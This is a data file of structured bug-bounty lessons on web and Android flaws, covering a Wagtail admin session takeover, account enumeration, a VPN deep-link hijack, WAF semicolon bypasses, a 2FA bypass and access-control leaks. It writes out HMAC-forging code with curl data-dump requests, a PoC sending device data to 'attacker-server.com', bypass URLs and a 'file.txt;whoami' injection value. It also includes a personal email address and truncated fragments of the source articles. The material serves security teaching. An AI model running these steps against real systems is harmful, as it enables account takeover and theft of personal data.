title: From statical site on up-to-date governement CMS to 0-click Administrator Account Takeover – a Bug…
summary_en: An unauthenticated Wagtail‑transfer endpoint with an empty secret key allowed an attacker to read any database model and steal a valid admin session, resulting in full administrator takeover.

lesson.cause: The application exposed the /wagtail-transfer/api/models/ endpoint without requiring authentication. The endpoint validates requests with an HMAC that uses the WAGTAILTRANSFER_SECRET_KEY, which the developers left empty by default. Because the secret is empty, anyone can compute a valid HMAC digest for any model name. The server then returns the requested model’s fields, including sensitive user data and session records. This design flaw gave an attacker direct read‑access to admin credentials and active sessions.
lesson.walkthrough:
RECON
Step 1: Identify the technology stack. The source code showed the site uses Wagtail, a Django‑based CMS.
Why: Knowing the framework points to known features such as the wagtail‑transfer API.

DISCOVERY
Step 2: Locate the transfer endpoint. The URL pattern /wagtail-transfer/api/models/<model_name>/ was found in the code.
Why: Endpoints often expose functionality; this one promised to read DB fields.
Step 3: Test the endpoint without authentication. A simple curl request to https://target/wagtail-transfer/api/models/auth.user/ returned a 403 unless a digest parameter was supplied.
Why: The endpoint expects a HMAC digest to prove knowledge of a secret key.
Step 4: Inspect configuration for the secret. The settings file contained WAGTAILTRANSFER_SECRET_KEY = "" (empty string).
Why: An empty secret means the HMAC can be generated with no secret.

EXPLOITATION
Step 5: Compute the HMAC digest for the model name "auth.user" using an empty key. Python code used:
import hmac,hashlib
def digest(m):
 return hmac.new(b"",m.encode(),hashlib.sha1).hexdigest()
print(digest("auth.user"))
Why: HMAC (Hash‑based Message Authentication Code) creates a hash that the server checks; with an empty key the result is predictable.
Step 6: Send the crafted request with the digest:
curl "https://target/wagtail-transfer/api/models/auth.user/?digest=9bcc6fdc372a8e9a1eaef96ff922c2bb06ba4162"
Why: The server accepts the digest and returns the JSON representation of the auth.user model, leaking password hashes and admin flags.
Step 7: Discover additional models. By enumerating model names, the researcher found "sessions.session".
Why: Session records store authentication tokens for logged‑in users.
Step 8: Compute the digest for "sessions.session" using the same empty‑key method.
Why: Same HMAC weakness applies.
Step 9: Request the session data:
curl "https://target/wagtail-transfer/api/models/sessions.session/?digest=bb4e8b258bb2e19df94882c940bae52a2187ed02"
Why: The response contains a valid session belonging to a super‑user.

IMPACT
Step 10: Use the stolen session cookie in a browser or HTTP client to impersonate the admin.
Why: The session cookie authenticates the attacker as a super‑user, granting full control over the site.
Step 11: Verify admin access by visiting the Wagtail admin dashboard.
Why: Successful login proves complete account takeover.
lesson.example:
Assume a fictional site https://target.example runs a Django app with a similar endpoint /transfer/api/models/<model>/. The settings contain TRANSFER_SECRET_KEY = "". An attacker runs:

import hmac,hashlib

def d(m):
 return hmac.new(b"",m.encode(),hashlib.sha1).hexdigest()

print(d('users'))

# Suppose the output is abcdef123456...

curl "https://target.example/transfer/api/models/users/?digest=abcdef123456"

The server returns the JSON of the users table, including password hashes. The attacker then queries the sessions model, steals a session belonging to an admin, and reuses the session cookie to log in as admin.
Why it works: The empty secret makes the HMAC digest trivially computable, and the endpoint does not check authentication, so any valid digest yields the data.
lesson.takeaway: When scanning Django or Wagtail applications, look for any /wagtail-transfer/ or similar data‑export endpoints that do not require authentication. Check configuration files for empty or default secret keys. Tools like dirsearch or Burp Intruder can help enumerate model names. Variants of this issue appear in other frameworks that use HMAC‑protected APIs (e.g., AWS S3 presigned URLs with missing secret). A common beginner mistake is to assume that an endpoint returning data is safe because it requires a digest; forgetting to verify that the secret is properly set leads to this bypass.

title: How I Found Account Enumeration on Two Endpoints of a Social Platform
summary_en: The platform’s email‑change and forgot‑password endpoints return different response codes for existing vs. non‑existing emails, allowing anyone to confirm whether an address is registered.

lesson.cause: The server’s implementation leaks account existence by returning distinct messages. In the email‑change endpoint, a logged‑in user receives either EMAIL_ALREADY_REGISTERED or OK depending on whether the new address is taken. The forgot‑password endpoint, which requires no authentication, returns OK for registered emails and USER_NOT_FOUND for unknown ones. Both endpoints expose the result in a machine‑readable field (the code property) instead of a generic message. No rate‑limiting or uniform error handling is applied, turning the API into an enumeration oracle.
lesson.walkthrough:
RECON
Step 1: Open the login page in a browser.
Request: GET https://target.example/login
Why: An HTTP request (a message from your browser to the server) loads the login HTML page.
Step 2: Log in with a valid account to obtain an authentication cookie.
Request: POST https://target.example/api/login {"email":"my@example.com","password":"p"}
Why: The server sets a cookie (small data stored by the browser) that proves you are authenticated for later requests.

DISCOVERY – Email‑change endpoint
Step 3: Navigate to Account Settings → Email and open the browser’s developer tools.
Why: The developer tools let you see the network traffic (HTTP requests) the page sends.
Step 4: Submit a new email address while the proxy (Burp Suite) is intercepting.
Request: POST https://target.example/api/account/email-change {"email":"test@example.com"}
Why: The request body contains a parameter (named email) whose value is the payload you control.
Step 5: Capture the raw request in Burp and send it to the Repeater tab.
Why: Repeater lets you replay and modify the same HTTP request repeatedly.
Step 6: Replace the email value with the address you want to test, e.g., victim@target.com.
Request: POST https://target.example/api/account/email-change {"email":"victim@target.com"}
Why: Changing the payload lets you query the server about any email.
Step 7: Send the modified request and observe the JSON response.
Response (registered): {"code":"EMAIL_ALREADY_REGISTERED"}
Response (not registered): {"status":1,"code":"OK"}
Why: The distinct code values act as an oracle – they reveal whether the email exists.

DISCOVERY – Forgot‑password endpoint
Step 8: Open the Forgot Password page (no login required) and start the proxy.
Why: This endpoint is public, so no authentication cookie is needed.
Step 9: Fill in an email address, solve the Cloudflare Turnstile CAPTCHA, and submit.
Request: POST https://target.example/api/password/forgot {"email":"test@example.com","turnstile_token":"…"}
Why: The turnstile_token parameter proves you solved the CAPTCHA; the email parameter is the payload.
Step 10: Capture the request, send it to Repeater, and swap the email value.
Request: POST https://target.example/api/password/forgot {"email":"victim@target.com","turnstile_token":"…"}
Why: Re‑using the same request with a different payload lets you test any address.
Step 11: Send the request and read the response.
Response (registered): {"code":"OK"}
Response (not registered): {"code":"USER_NOT_FOUND"}
Why: Again, different code values disclose account existence.

IMPACT
Step 12: Automate the two steps (solve Turnstile via a service or reuse a valid token) and iterate over a list of emails to build a confirmed user list.
Why: With the oracle you can filter leaked credential dumps, perform credential stuffing, password spraying, or targeted phishing with higher success rates.
lesson.takeaway: When hunting web APIs, always look for endpoints that accept an email (or username) and return different status codes or messages for existing vs. non‑existing values – these are classic enumeration points. Tools like Burp Suite or OWASP ZAP can capture the raw request and let you replay it with varied payloads. Remember to check both authenticated and unauthenticated routes; public password‑reset flows are especially valuable. Variants include phone‑number checks, username‑availability APIs, or social‑login callbacks that reveal account status. A common beginner mistake is to assume a generic error means the bug is not present; always compare raw JSON or HTTP status codes, not just UI messages.
lesson.fix: Modify both endpoints to return a single, generic response regardless of account existence. For the email‑change API, always reply with {"code":"OK"} and, if the address is taken, silently send a notification to the existing owner instead of exposing the state. For the forgot‑password API, respond with a constant message such as "If an account with this email exists, you will receive a reset link" and the same JSON code for all inputs. Add rate limiting (e.g., max 3 attempts per hour per IP or per account) and require the current password for email changes. Ensure the server does not include any distinguishing fields (like EMAIL_ALREADY_REGISTERED or USER_NOT_FOUND) in the response body.

The secure way to handle this is to always say something vague like ”Incorrect email or password” — never hinting which one was wrong. Account enumeration is when a website accidentally reveals whether an email address is registered. This writeup covers two places I found this on the same platform. > **The Target** Platform

title: Hijacking Your VPN with one Deep Link
summary_en: An exported Android activity in a VPN client allowed malicious apps to supply a custom backend server via an unvalidated deep link parameter, leading to the theft of sensitive device and user data.

lesson.cause: The vulnerability is caused by the app exporting activities—components accessible to other apps—that process deep links (URLs that open apps) without validation. Specifically, the 'WebLoginCallbackActivity' and 'WebCallbackHandlerActivity' accept a 'fqdn' parameter (a server address) from any incoming Intent (a message between apps). Because the app fails to verify that the link originated from its own login process or that the hostname belongs to a trusted domain, it allows a local malicious app to redirect the VPN's registration traffic to an attacker-controlled server.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher obtains the APK (the Android app file) and decompiles it (turns it back into readable code) using a tool called jadx.
2. They search the 'AndroidManifest.xml' (the app's configuration file) for 'exported' activities, which are screens that any other app on the device can start.
<activity android:name=".ui.WebLoginCallbackActivity" android:exported="true">
Why: Exported activities are the primary entry points for local attacks on Android because they allow external apps to send them data.

DISCOVERY
3. They find that 'WebLoginCallbackActivity' uses 'getIntent().getData()' to read a deep link (a special URL that opens an app screen).
4. The code extracts a parameter (a piece of data in the URL) called 'fqdn' (the server's web address).
String fqdn = data.getQueryParameter("fqdn");
Why: This parameter tells the app which server it should talk to for its initial setup and registration.
5. The researcher notices the app uses this 'fqdn' as its base URL (the main address for all its internet requests) without any validation.
Why: Without an allowlist (a list of approved addresses), the app will send sensitive data to any address provided in the URL.

EXPLOITATION
6. The researcher writes a PoC (Proof of Concept, a small test app) that only requires the 'INTERNET' permission.
<uses-permission android:name="android.permission.INTERNET" />
Why: This demonstrates that the attack does not require high-level system privileges or 'root' access.
7. The PoC app creates a fake deep link URL pointing to the attacker's server.
Uri uri = Uri.parse("vpnclient://callback?fqdn=attacker-server.com");
Why: This URL mimics the real login response but replaces the legitimate server with one controlled by the attacker.
8. The PoC app sends an Intent (a message between apps) directly to the target VPN app's exported activity.
intent.setComponent(new ComponentName("com.vendor.vpnclient", "...WebLoginCallbackActivity"));
Why: This forces the VPN app to open and process the malicious URL immediately.
9. The researcher opens the real VPN app and taps 'Login' to start the 180-second 'window' where the app accepts callbacks.
Why: The app only listens for these links for 3 minutes after a login starts, but an automated app can easily trigger the exploit within this time.
10. While the login browser is open, the researcher runs the PoC app to fire the forged callback.
Why: The PoC app sends the fake link while the VPN app is still waiting for the real one, winning the race.

IMPACT
11. The VPN app accepts the fake server address and sends a 'registration' request to the attacker's server.
GET /portal/services?action=discover&username=5550199&device_mac=00:11:22...
Why: The app thinks it is talking to its own server, so it automatically transmits the user's private information.
12. The attacker captures the user's MSISDN (phone number), MAC address (hardware ID), and GUID (unique device ID).
Why: This data provides a permanent fingerprint of the user and their device, which can be used for tracking or further attacks.
lesson.takeaway: When hunting for Android bugs, always audit 'exported' activities in the manifest, especially those handling 'android.intent.action.VIEW'. Look for parameters that define hostnames, URLs, or file paths using 'getIntent().getData()'. A common signal is when these parameters are used to configure network clients like Retrofit or OkHttp. Variants of this bug include 'Intent Redirection,' where an app is forced to launch a private activity, or 'File Provider' leaks. Avoid the mistake of assuming that only the system browser can trigger your deep links; any app on the device can send a direct Intent to an exported activity.

During the short window where the app is waiting for an OAuth login to complete, a malicious app sitting on the same device can hand it a different backend, and the VPN client happily starts sending its device-registration API calls there, which was caused by an unvalidated `fqdn` parameter on an exported deep-link callback and led to potentially leaking the user's phone number, MAC address, device GUID, and more _._ ## My workflow: decompile, triag

title: A 403 Bypass Worth $900: How a Semicolon Exposed API Documentation
summary_en: A researcher bypassed Cloudflare's 403 Forbidden restrictions on an API documentation page by injecting semicolons into the URL path, exploiting a parsing discrepancy between the security filter and the backend server.

lesson.cause: The vulnerability is caused by a path normalization discrepancy between the Web Application Firewall (WAF) and the backend application server. A WAF (a security tool that filters web traffic) often uses strict pattern matching to block specific URLs like '/service/v4/reference/'. However, some backend frameworks, such as Java Spring, support 'matrix variables,' which allow parameters to be embedded directly in the URL path using semicolons. When the researcher added a semicolon, the WAF saw a path that did not match its 'blocked' list (e.g., '/v4;/'). Meanwhile, the backend server stripped the semicolon and its following characters during its own normalization process (the way a server cleans up a URL), routing the request to the intended restricted resource.
lesson.walkthrough:
RECON
1. The researcher began by investigating an API subdomain (a prefix added to a main domain name like 'api.example.com') belonging to the target.
2. They visited the root URL but received a '403 Forbidden' response (a status code meaning the server refuses to authorize the request) from Cloudflare.
3. To find hidden paths, they used Yahoo Search to find indexed URLs (web addresses that a search engine has saved in its database).
4. They discovered a functional API URL: 
https://example.com/service/v4/catalog/en/items/482901/feedback?limit=10&page=1&sort=recent&direction=desc
5. This revealed that the application used a '/service/' prefix for its API routes (specific web addresses where an API can be reached).

DISCOVERY
6. The researcher navigated to the base service path: 
https://example.com/service
7. On this page, they found a link to 'Interactive REST API documentation.'
8. Clicking the link led to a Swagger UI page (a visual map that shows all the secret paths and instructions of an API), but it was blocked: 
https://example.com/service/v4/reference/start.html

EXPLOITATION PHASE 1
9. The researcher attempted to bypass the block by adding a semicolon (;) after the version segment of the URL.
10. Payload used: 
https://example.com/service/v4;/reference/start.html
11. Why: The semicolon tells the backend to treat the segment as a 'matrix variable' (extra data in the path), but the WAF sees it as a different, unblocked path. (A segment is the part of a URL between two slashes).
12. The server responded with a '200 OK' (success), and the documentation loaded.

EXPLOITATION PHASE 2
13. Two years later, the researcher found the original semicolon trick was fixed and now returned a 403.
14. They tried a new variation by placing the semicolon later in the path and adding a dummy key-value pair.
15. Payload used: 
https://example.com/service/v4/reference/;foo=bar/start.html
16. Why: ';foo=bar' is a standard matrix variable format. The security filter was likely only looking for semicolons in specific spots, not everywhere.
17. This second variation successfully bypassed the new security rule.

IMPACT
18. The researcher demonstrated that they could still access the Swagger UI, exposing the entire structure of the API.
19. They also found other working variations: 
https://example.com/service/v4/reference;/start.html
20. And: 
https://example.com/service/v4/reference/;/start.html
21. The researcher reported both findings, proving that a simple character can bypass expensive security layers.
lesson.example: Imagine a website 'target.example' that blocks access to its admin panel at 'https://target.example/api/v1/admin'. The security filter (WAF) is programmed to block any request containing the exact string '/admin/'. An attacker sends a request to 'https://target.example/api/v1/admin;user=guest/settings'. The WAF looks at the path, sees '/admin;user=guest/', decides it does not match the forbidden '/admin/' string, and lets it through. The backend server, built with a framework like Spring, sees the semicolon and ignores everything from the semicolon to the next slash. It processes the path as '/api/v1/admin/settings', granting the attacker access to the admin settings page because the security check was bypassed.
lesson.takeaway: This bug highlights the importance of 'Path Normalization' testing. When you encounter a 403 Forbidden error, never assume the path is truly unreachable; instead, try injecting characters that different servers interpret differently, such as semicolons (;), dots (.), or null bytes (%00). Use alternative search engines like Yahoo or DuckDuckGo to find 'leaked' paths that Google might have missed. A common mistake for beginners is giving up after one bypass is fixed; as shown here, moving the payload to a different segment of the URL can often bypass the new, specific filter. Look for this pattern in Java (Spring), Python (Flask), and Ruby on Rails applications.

title: I Spent 6 Hours on a Report That Got Closed in 4 Minutes. Here’s What I Learned.
summary_en: A researcher identified an API endpoint that leaked the existence of usernames through different error messages, but the report was closed due to a lack of exploitable impact.

lesson.cause: The root cause was a lack of uniform error handling on the authentication endpoint. The API (a set of rules allowing programs to talk to each other) returned 'User not found' for non-existent accounts and 'Incorrect password' for existing ones. This behavior (how the application acts) allowed for user enumeration (the process of identifying valid usernames). However, the application implemented security controls like rate limiting (restricting the number of requests a user can make) which prevented further exploitation.
lesson.walkthrough:
RECON
1. The researcher identified an authentication endpoint used for logging into the application.
2. They observed the HTTP response (the data sent back by the server) when trying different login inputs.

DISCOVERY
3. The researcher sent a request with a username they knew did not exist.
POST /api/login HTTP/1.1
{"username": "fakeuser123", "password": "password123"}
4. The server responded with a specific error message.
{"status": "error", "message": "User not found"}
Why: The application logic explicitly checks if the user exists before checking the password, revealing the account's absence (a beginner-friendly way to say the code branches too early).
5. The researcher sent a request with a username they knew did exist.
POST /api/login HTTP/1.1
{"username": "admin", "password": "wrongpassword"}
6. The server responded with a different error message.
{"status": "error", "message": "Incorrect password"}
Why: The application logic confirmed the user exists and then failed on the password check, confirming the account's existence.

EXPLOITATION (FAILED)
7. The researcher attempted to automate this to find many usernames.
8. They discovered the server had rate limiting (a security measure that slows down or blocks users making too many requests in a short time).
9. They discovered the server had account lockout (a feature that disables an account after too many failed login attempts).

IMPACT ASSESSMENT
10. The researcher submitted the report as 'User Enumeration' to the bug bounty program.
11. The triager (the professional who reviews and validates bug reports) closed the report as 'Informative' or 'Not a Vulnerability'.
12. Why: Because the attacker could not use the discovered usernames to perform a brute-force attack (trying many passwords) due to the existing security controls, the behavior had no exploitable impact.
lesson.takeaway: The most important lesson is to distinguish between a 'behavior' and a 'bug.' A bug must have an impact—a way for an attacker to actually cause harm or bypass security. When you find something 'weird' like different error messages, always ask 'So what?'. If the application has rate limiting or other controls that prevent you from using that information, it is likely not a vulnerability. Look for 'chained' vulnerabilities where one small leak leads to a larger exploit, and always verify if a security control (like a lockout) is actually working before reporting.

title: RCE and bad crypto in Internxt's 'post-quantum' cloud storage
summary_en: A critical Remote Code Execution (RCE) vulnerability and cryptographic weaknesses were identified in Internxt's cloud storage platform.

lesson.example: Imagine a cloud storage service at target.example that lets users rename files. The server uses a system command (a direct instruction to the computer's operating system) to perform the rename. If the application does not clean the input (the data sent by the user), an attacker can use special characters like a semicolon (;) to chain a second, malicious command. Vulnerable Code Snippet: `os.system('mv ' + old_name + ' ' + new_name)`. Attack Request: `POST /rename?new_name=file.txt;whoami`. Why: The server executes `mv old.txt file.txt;whoami`. The semicolon acts as a command separator (a character that marks the end of one instruction and the start of another), telling the computer to finish the move command and then immediately run `whoami` (a command that reveals the identity of the user running the web server). This is Remote Code Execution (RCE), where an attacker runs their own code on the target machine.

title: It Returned 404… But the Data Was Still There
summary_en: An application attempted to hide sensitive admin data by displaying a 404 Not Found error page, but the underlying HTTP response still contained the full list of employee data.

lesson.cause: The vulnerability stems from a 'client-side security' flaw where the server-side logic fetches sensitive data before or during an authorization check. Instead of preventing the data from being sent, the application sends the data to the browser and then relies on the user interface to hide it if the user is unauthorized. Specifically, the endpoint api/get-users was configured to return a 404 status code to unauthorized users, but it failed to clear the response body, leaving the sensitive JSON data accessible to anyone inspecting the network traffic.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher used waybackurls (a tool that fetches old URLs from internet archives) and katana (a tool that crawls websites to find hidden links) to gather a list of endpoints.
waybackurls target.example | katana
Why: To find hidden or forgotten pages that might not be linked on the main site (endpoints are specific web addresses like /login or /api/data).

2. The researcher filtered the results to look for sensitive keywords like 'admin'.
grep "admin" endpoints.txt
Why: Admin pages often contain more sensitive functionality or data than standard user pages.

DISCOVERY
3. The researcher attempted to visit one of the discovered admin URLs in a web browser.
https://target.example/admin-dashboard
Why: To see if the page is publicly accessible or protected by a login (authentication is the process of verifying who a user is).

4. The browser displayed a 'You can’t access this page — 404' message.
Why: A 404 error usually means 'Not Found,' suggesting the page doesn't exist or is hidden.

5. While the page was loading, the researcher noticed a table of data appeared and disappeared in less than a second.
Why: This 'flicker' suggests the browser received data and tried to show it before the website's code decided to hide it.

EXPLOITATION
6. The researcher opened Burp Suite (a tool used to intercept and inspect web traffic between a browser and a server).
Why: To see the raw HTTP request (the message the browser sends to the server) and the HTTP response (the message the server sends back).

7. The researcher reloaded the admin page while Burp Suite was running.
Why: To capture the exact data being sent by the server to the browser.

8. In the Burp Suite 'HTTP history' tab, the researcher located a request to a specific data-fetching endpoint.
GET /api/get-users HTTP/1.1
Why: Modern websites often load a 'shell' page first and then make separate requests to an API (Application Programming Interface, a way for programs to talk to each other) to get the actual data.

9. The researcher inspected the response from the server for that request.
HTTP/1.1 404 Not Found
Content-Type: application/json
[{"id":1,"name":"John Doe","email":"john@example.com"},...]
Why: Even though the status code was 404 (Not Found), the response body (the actual content of the message) contained the full list of employee data.

IMPACT
10. The researcher confirmed that any user could view sensitive employee PII (Personally Identifiable Information) without logging in.
Why: The server failed to implement proper access control (rules that determine who can see what data) at the data level.
lesson.example: Imagine a website at 'target.example/admin/logs'. When a regular user visits, the website's JavaScript code checks if 'user.role' is 'admin'. If not, it shows a '404 Not Found' image. However, the code still runs a background command: 'fetch("/api/admin/raw-logs")'. The server receives this request and, because it doesn't check permissions on the server-side, it sends back a JSON file containing all system logs. An attacker simply opens their browser's 'Network' tab (F12), clicks on the 'raw-logs' request, and reads the sensitive data in the 'Response' section, completely bypassing the 404 image shown on the screen.
lesson.takeaway: Always look for 'flickering' UI elements that appear briefly before an error message; this is a major red flag that data is being sent before authorization is verified. Use a proxy tool like Burp Suite to inspect every response, as developers often use 'Security through Obscurity' (trying to hide things rather than securing them) by sending a 404 or 403 status code while still including the data in the body. A common variant of this is 'Information Disclosure via Client-Side Routing,' where the frontend hides a component but the backend API remains wide open. Avoid the mistake of trusting the browser to hide data; if the data reaches the user's computer, it is already compromised.

title: The AES Key That Bypassed Every Fix: From Mass PII Exposure to 2FA Bypass
summary_en: A hardcoded AES encryption key in frontend JavaScript allowed a researcher to decrypt sensitive API responses and bypass Two-Factor Authentication (2FA) by tampering with the encrypted verification state.

lesson.cause: The developers attempted to secure sensitive data by encrypting API responses, but they stored the secret AES key in the frontend JavaScript (code that runs in the user's browser), making it accessible to anyone. Additionally, the server relied on the client to send back an encrypted status string ('N' for No, 'Y' for Yes) to confirm 2FA completion, rather than tracking the 2FA state securely on the server side. This implementation flaw allowed an attacker to use the exposed key to forge a 'successful' 2FA response.
lesson.walkthrough:
RECON
Step 1: The researcher examined the frontend JavaScript (code that runs in the browser) and discovered a hardcoded AES key.
<AES-KEY>
Why: Hardcoded secrets in client-side code are accessible to any user who views the page source or uses browser developer tools.

DISCOVERY
Step 2: The researcher identified that the application was sending encrypted responses from various API endpoints (interfaces that allow programs to talk to each other).
GET /api/proxy-service/companies?tenantCode=PIL&companyRegistrationNumber=1
Why: The application used encryption to hide sensitive data like PII (Personally Identifiable Information) after previous vulnerabilities were reported.

Step 3: The researcher wrote a Node.js script to attempt decryption using the discovered key and the AES-GCM algorithm (a specific method of encryption that ensures data integrity).
const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
Why: By mimicking the application's internal logic, the researcher could unscramble the data into readable text.

EXPLOITATION: DATA EXPOSURE
Step 4: The researcher successfully decrypted the API response, revealing sensitive company and contact data.
console.log(decrypted);
Why: Since the key was known, the encryption provided no actual security against a motivated user.

EXPLOITATION: 2FA BYPASS
Step 5: The researcher observed the 2FA (Two-Factor Authentication, an extra security layer) flow and captured an encrypted verification response.
<encrypted_2fa_response>
Why: The researcher suspected the same key might be used for other security-critical functions.

Step 6: The researcher decrypted the 2FA response and found a simple status string.
mahmoudmagdy45456@gmail.com:null:1776557237487:N
Why: The 'N' at the end of the string represented 'No,' indicating the 2FA was not yet completed.

Step 7: The researcher modified the decrypted string, changing the 'N' to a 'Y' (representing 'Yes').
mahmoudmagdy45456@gmail.com:null:1776557237487:Y
Why: The goal was to trick the server into thinking the 2FA process was successful.

Step 8: The researcher wrote a script to re-encrypt the modified string using the same AES key and a new IV (Initialization Vector, a random number used to start encryption).
const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
Why: To be accepted by the server, the modified data had to be encrypted exactly like a legitimate response.

This works because the server trusts the client to hold and return sensitive state information that the client can actually manipulate.

title: How Changing a POST Request to GET Exposed Users’ PII and Earned Me a $5,000 Bounty
summary_en: Changing a POST request to a GET request on the privacy‑request endpoint returned other users’ personal data, exposing a broken access‑control flaw.

lesson.cause: The endpoint that processes privacy‑request records accepted both POST and GET methods but only enforced authorization on the POST path. When the researcher switched the HTTP method from POST to GET, the server skipped the user‑identity check. The request body, which normally contained the authenticated user’s ID, was removed, so the backend had no way to know who was asking. Because the code relied on the presence of a POST payload to enforce access, any GET request without a body was treated as a generic query and returned all matching records. This design flaw allowed unauthenticated enumeration of other users’ privacy requests.
lesson.example:
**Vulnerable snippet (fictional target.example)**
```python
# Flask‑like pseudo code
@app.route('/api/privacy', methods=['POST','GET'])
def privacy():
    if request.method == 'POST':
        user_id = request.json.get('user_id')   # only POST reads body
        # correct: verify user_id belongs to authenticated session
    else:  # GET
        # BUG: no authentication check here
        records = db.query('SELECT * FROM privacy_requests')
        return json.dumps(records)
```
**Attack request**
```
GET https://target.example/api/privacy HTTP/1.1
Host: target.example
```
**Why it works**: The GET request reaches the same endpoint but the code never checks who is calling, so the database returns every privacy‑request record. Because no body is sent, the server cannot infer a user identity, yet it still returns data, leaking PII.
lesson.takeaway: When testing APIs, never assume that an endpoint is safe just because the application uses a specific HTTP method. Look for endpoints that accept multiple methods and try each one, especially GET, which is often cached and may bypass auth checks. Review API documentation for filtering or pagination parameters – they can be abused to pull large data sets. Tools like Burp Suite or OWASP ZAP make it easy to replay a request with a different method. Variants of this bug appear in services that treat GET as a read‑only shortcut without re‑checking authentication, such as analytics dashboards or export endpoints. Beginners often forget to test method changes, missing this simple yet powerful flaw.
lesson.fix: Add a strict authorization check that runs for every HTTP method, not just POST. The server should verify the caller’s session or token before querying any records, and it must bind the query to the authenticated user’s ID. If the endpoint is intended to be write‑only, configure the router to reject GET requests with a 405 Method Not Allowed response. Additionally, enforce least‑privilege by limiting returned fields to only what the requester is allowed to see. After the fix, a GET request without proper credentials should return an error instead of the full data set.

title: Exposure of Shareable AWS S3 Pre-Signed Download URLs for Paid Digital Products
summary_en: A GraphQL API endpoint leaked AWS S3 pre-signed URLs for paid digital products, allowing anyone to download restricted content without payment or authentication for up to 24 hours.

lesson.cause: The application's GraphQL API was designed to return a pre-signed S3 download URL in the 'listing.url' field by default when retrieving product information. The root cause was a failure to verify if the requesting user had actually purchased the product before generating this temporary access link. Because the URL functioned as a 'bearer token' (possession equals access), the application relied on the secrecy of the URL rather than proper authorization logic. Additionally, the URL expiration was set to a very long duration (86400 seconds), increasing the window for unauthorized access.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher accessed the Linktree platform and navigated to the digital products section where creators sell files.
2. They used a proxy tool to intercept the HTTP requests (messages sent by your computer to a server asking for data) between the browser and the server.

DISCOVERY
3. The researcher identified a GraphQL request (a specific way for apps to ask for exactly the data they need) used to fetch product details.
4. They inspected the response from the server and found a field named 'listing.url'.
listing.url
Why: This field contained a long web address pointing directly to Amazon's storage service (AWS S3).
5. The researcher analyzed the URL and found several AWS signing parameters (special codes that grant temporary permission to a file).
?X-Amz-Algorithm=...&X-Amz-Credential=...&X-Amz-Date=...&X-Amz-Expires=86400&X-Amz-Signature=...
Why: These parameters prove to Amazon that the person who generated the link has permission to share the file. The 'X-Amz-Expires=86400' part means the link stays active for 86,400 seconds (24 hours).

EXPLOITATION
6. The researcher copied the entire URL from the GraphQL response.
7. They opened a new 'Incognito' or private browser window where they were NOT logged into Linktree.
8. They pasted the URL directly into the address bar and pressed Enter.
https://[bucket-name].s3.amazonaws.com/[file-path]?X-Amz-Algorithm=...[rest of signature]
Why: This tests if the link is a 'bearer credential' (a key that works for anyone who holds it, regardless of their identity).

IMPACT
9. The browser immediately began downloading the digital product (e.g., a PDF or image) that was supposed to be behind a paywall.
10. The researcher confirmed that no Linktree session or cookie (a small file used to remember your login status) was required to access the file.
11. This proved that any user—even one who hadn't paid—could obtain and share these links to bypass the store's payment system.
lesson.takeaway: When hunting for bugs, always inspect API responses (especially GraphQL and JSON) for long URLs containing 'Amz-Signature' or 'Signature'. These are often pre-signed URLs. Always test if these URLs can be opened in a private browser window without being logged in. If the URL points to content that should be paid or private, you have found a vulnerability. A common mistake is assuming that because a URL is long and 'random-looking,' it is secure; in reality, if the API gives it to an unauthorized user, the security is broken. Look for 'Expires' values—longer durations (like 24 hours) significantly increase the severity of the leak.
lesson.fix:
The application must separate 'viewing product info' from 'downloading the product.' The GraphQL query for product details should not include the download URL. Instead, the URL should only be generated through a specific 'Download' endpoint that first checks the database to ensure the current user has a valid purchase record for that specific item. Additionally, the 'X-Amz-Expires' value should be set to a very short time (e.g., 60 to 300 seconds) to minimize the risk of link sharing.

Fixed Logic:
1. User requests product info -> Server returns name and price (NO URL).
2. User clicks 'Download' -> Server checks: 'Has this user paid?'
3. If yes -> Server generates a 5-minute pre-signed URL and sends it.
4. If no -> Server returns '403 Forbidden'.

title: When a Production Backend Has No Authentication: Internal Disclosure and Unauthenticated State…
summary_en: A Spring Boot commerce backend exposed its OpenAPI spec and all business endpoints without any authentication, allowing anyone to read internal details and submit orders anonymously.

lesson.cause: The root cause was the complete absence of an authentication layer. The OpenAPI document (/v3/api-docs) did not define any security scheme, so the server advertised no auth requirement. Each business operation, including the order‑submission endpoint, also lacked code that checks for a valid session, token, or API key. Because the developers relied on the OpenAPI spec to convey security, they never added runtime checks. Consequently, the service treated every HTTP request as trusted, exposing both data and state‑changing actions to the public internet.
lesson.walkthrough:
RECON
Step 1: Identify the target host and base path.
GET https://example.com/v3/api-docs
Why: Sends an HTTP GET request (a request to retrieve data) to the OpenAPI endpoint; the response code 200 shows the service is reachable without credentials.
Step 2: Examine the returned OpenAPI JSON for a "security" field.
Why: The OpenAPI spec defines authentication requirements; the absence of a "security" object confirms no auth is required (no "Authorization" header needed).
DISCOVERY
Step 3: List all paths from the OpenAPI document.
Why: The spec lists every endpoint (e.g., /order, /metrics); this gives a map of the application without guessing URLs.
Step 4: Locate a state‑changing endpoint such as the order‑submission path.
Why: Business operations are described in the spec; finding a POST method indicates a write operation.
EXPLOITATION
Step 5: Craft an HTTP POST request to the order endpoint with a JSON body you control.
POST https://example.com/order
Content-Type: application/json
{ "product_id": "123", "quantity": 1 }
Why: Sends a payload (data sent to the server) that the endpoint accepts; no Authorization header is needed, so the request is accepted anonymously.
Step 6: Observe the HTTP 200 response with an acknowledgement message.
Why: The server returns a success code, proving the operation succeeded without authentication.
IMPACT
Step 7: Note that internal diagnostics (e.g., /actuator/info, /actuator/metrics, /actuator/peer-info) also return data without auth.
Why: These endpoints expose build metadata, internal IPs, and service dependencies, giving an attacker a detailed view of the environment.
lesson.example:
**Fictional vulnerable service**: https://target.example/api
- Vulnerable endpoint: POST /api/create‑order
- Expected auth: Bearer token in Authorization header (but missing).
- Attack request:
POST https://target.example/api/create-order
Content-Type: application/json
{ "item":"widget", "qty":5 }
Why it works: The server does not check for an Authorization header, so the JSON payload is processed as a legitimate order. The response contains "order received" confirming the state change.
lesson.takeaway: When an API publishes its OpenAPI/Swagger spec publicly, always verify the "security" section; a missing scheme often means the endpoints are unauthenticated. Look for unauthenticated access to /actuator/*, /metrics, or any POST/PUT routes. Tools like `curl`, `httpie`, or Burp Suite can quickly fetch the spec and test endpoints. Variants include services that rely on network‑level firewalls instead of auth, or that expose admin consoles without login. Beginners often forget to test POST endpoints after seeing a public spec, assuming they are protected; always try them.
